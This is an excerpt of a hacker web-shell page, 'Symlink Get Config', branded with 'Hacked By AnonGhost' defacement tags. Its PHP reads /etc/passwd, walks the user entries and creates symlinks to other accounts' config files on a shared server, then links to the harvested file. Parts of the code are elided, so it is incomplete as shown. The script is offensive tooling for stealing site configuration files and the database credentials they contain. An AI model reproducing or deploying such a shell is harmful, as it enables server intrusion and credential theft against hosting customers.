<html>
<head>
<title>Symlink Get Config - SMokSec</title>
<meta property="og:title" content="$ Tatsumi Crew $"/>      <meta property="og:description" content="Hacked By AnonGhost"/>
...
<img src="https://images2.imgbox.com/f2/79/Zwn0aT8K_o.jpg" width="400" height="300">
</img><br>
...
<form method="post">
<center>
<center><textarea style="color:#3498DB;background-color:#000000" cols="60" name="passwd" rows="20">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
...
</br><input style="color:#3498DB;background-color:#000000" name="conf" size="10"
...
echo '<i><b><a href='.$folfig.'>File Here!</a></b></i></center>';
}
?>
</td></table></body></html>